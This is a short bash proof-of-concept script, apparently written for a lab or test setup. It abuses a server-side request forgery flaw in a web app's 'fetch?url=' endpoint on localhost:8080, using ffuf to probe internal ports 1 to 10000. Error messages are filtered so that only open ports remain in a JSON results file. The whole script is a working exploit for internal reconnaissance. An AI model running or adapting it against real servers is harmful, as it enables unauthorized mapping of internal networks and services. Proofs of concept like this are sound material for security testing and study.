#!/bin/bash

# PoC script to find open ports on localhost via SSRF

PORTS_FILE="ports.txt"
TARGET_HOST="http://localhost:8080"
INTERNAL_IP="127.0.0.1"
RESULTS_FILE="ssrf_scan_results.json"
MAX_PORT=10000

echo "[*] Generating port list (1-$MAX_PORT) -> $PORTS_FILE"
seq 1 $MAX_PORT > $PORTS_FILE

echo "[*] Starting SSRF-based port scan against $TARGET_HOST"
echo "    >> Probing $INTERNAL_IP"
echo "    >> Filtering 'Error fetching URL'"

# Run ffuf
# - We filter 'Error fetching URL' to HIDE closed/filtered ports.
# - Any remaining results are "interesting" and indicate an open port,
#   which will likely show a '500' status and a "malformed HTTP response" error.
ffuf -w ./$PORTS_FILE \
     -u "$TARGET_HOST/fetch?url=http://$INTERNAL_IP:FUZZ" \
     -fr "Error fetching URL" \
     -o $RESULTS_FILE -of json

echo "[+] Scan complete."
echo "[+] Review $RESULTS_FILE for any entries, which indicate open ports."
